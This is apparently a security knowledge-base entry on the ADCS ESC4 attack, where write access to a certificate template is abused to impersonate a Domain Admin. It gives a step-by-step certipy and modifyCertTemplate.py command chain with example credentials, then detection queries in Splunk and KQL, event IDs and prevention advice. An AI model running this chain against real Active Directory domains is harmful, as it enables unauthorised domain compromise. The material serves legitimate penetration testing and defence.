name: ADCS ESC4 - Certificate Template Modification
description: ESC4 exploits write access (GenericWrite/WriteDACL/WriteProperty) to a certificate template. An attacker modifies the template to enable Subject Alternative Name (SAN), turning it into an ESC1-vulnerable template, then requests a certificate impersonating a Domain Admin.
source: SpecterOps Certified Pre-Owned; CRTP ADCS module
notes:
=== CONDITIONS ===
1. User has write access to a certificate template
   (GenericWrite, WriteDACL, WriteProperty, WriteOwner)
2. The template is published on a CA
3. Template allows client authentication EKU

=== FIND WRITABLE TEMPLATES ===
  certipy find -u <user>@<domain> -p <pass> -dc-ip <dc_ip> -vulnerable -stdout
  # Look for ESC4 in output
  # Or check ACLs manually with PowerView:
  Get-ADObject -Filter {objectClass -eq "pKICertificateTemplate"} | ForEach-Object {
    Get-Acl "AD:\$($_.DistinguishedName)" | Select-Object -ExpandProperty Access
  }

=== ATTACK CHAIN ===
  # Step 1: Save original template (for cleanup)
  modifyCertTemplate.py <domain>/<user>:<pass> -template <vuln_template> -get-acl -dc-ip <dc_ip>

  # Step 2: Modify template to allow SAN
  modifyCertTemplate.py <domain>/<user>:<pass> -template <vuln_template> -add enrollee_supplies_subject -dc-ip <dc_ip>

  # Step 3: Request cert with SAN (now ESC1)
  certipy req -u <user>@<domain> -p <pass> -ca <ca_name> -template <vuln_template> -upn administrator@<domain> -dc-ip <dc_ip>

  # Step 4: Authenticate
  certipy auth -pfx administrator.pfx -dc-ip <dc_ip>

  # Step 5: CLEANUP - restore template
  modifyCertTemplate.py <domain>/<user>:<pass> -template <vuln_template> -remove enrollee_supplies_subject -dc-ip <dc_ip>

=== ALTERNATIVE: ADCSTemplate ===
  # PowerShell:
  Set-ADCSTemplate -DisplayName <template> -Identity <domain>\<user> -Setting enrollee_supplies_subject

examples.label: Request cert as admin
examples.command: certipy req -u jdoe@corp.local -p Password123 -ca corp-CA -template VulnTemplate -upn administrator@corp.local -dc-ip 192.168.1.10

recommended.note: ESC1 is what the template becomes after ESC4 modification.
ESC2 is another template misconfiguration (Any Purpose EKU).

defense.why_it_works: Certificate templates are AD objects with ACLs. If a user has write access, they can modify the template properties to enable Subject Alternative Name, which allows requesting certificates for any user.
defense.prerequisites: Write access (GenericWrite/WriteDACL/WriteProperty) to a published certificate template.
defense.impact: Domain compromise by impersonating Domain Admin via modified certificate template.
defense.detection: [MITRE T1649] Certificate template modification events; template ACL changes; enrollment after template change.
defense.artifacts: Event 4899 (template modified); LDAP writes to pKICertificateTemplate objects; certificate request shortly after template change.
defense.splunk_spl:
index=windows EventCode=5136 ObjectClass="pKICertificateTemplate"
| where AttributeLDAPDisplayName IN ("msPKI-Certificate-Name-Flag", "msPKI-Enrollment-Flag")
| table _time, SubjectUserName, ObjectDN, AttributeLDAPDisplayName, AttributeValue
defense.sentinel_kql:
SecurityEvent
| where EventID == 5136
| where ObjectClass == "pKICertificateTemplate"
| project TimeGenerated, SubjectUserName, ObjectDN, AttributeLDAPDisplayName, AttributeValue
defense.prevention: Restrict write access to certificate templates; monitor template modifications; use template version tracking; alert on any template property changes.

detections.name: ESC4 - Certificate template modification
detections.logic:
SecurityEvent
| where EventID == 5136
| where ObjectClass == "pKICertificateTemplate"
| where AttributeLDAPDisplayName has_any ("msPKI-Certificate-Name-Flag", "msPKI-Enrollment-Flag", "msPKI-RA-Signature")
| project TimeGenerated, SubjectUserName, ObjectDN, AttributeLDAPDisplayName, AttributeValue
detections.tuning: Any non-PKI-admin modifying certificate template flags is extremely suspicious
